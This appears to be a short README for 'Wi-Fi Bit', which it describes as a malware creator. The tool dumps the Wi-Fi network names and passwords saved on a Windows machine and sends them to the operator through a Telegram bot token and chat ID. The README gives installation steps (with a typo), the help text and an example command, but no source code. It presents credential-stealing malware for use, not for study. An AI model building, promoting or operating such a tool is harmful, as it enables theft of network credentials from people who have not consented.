# Wi-Fi Bit
Wi-Fi Bit is a simple malware creator for dumping WiFi `SSID` and `Password` which connected before.
This tool is using telegram bot `Token` and your `chat-id` to send dumped `credentials`
## Installation
1. Install Python On Your Windows

2. ```
   pip insatll -r requirements.txt
   ```
## Usage
#### Help
```
usage: WiFiBit.exe -t <token> -i <chatid>

options:
  -h, --help            show this help message and exit
  -i ID, --id ID        Chat ID
  -t TOKEN, --token TOKEN
                        Bot API Token
```
#### Example
```
Wi-FiBit.exe -t <TOKEN> -i <CHATID>
```
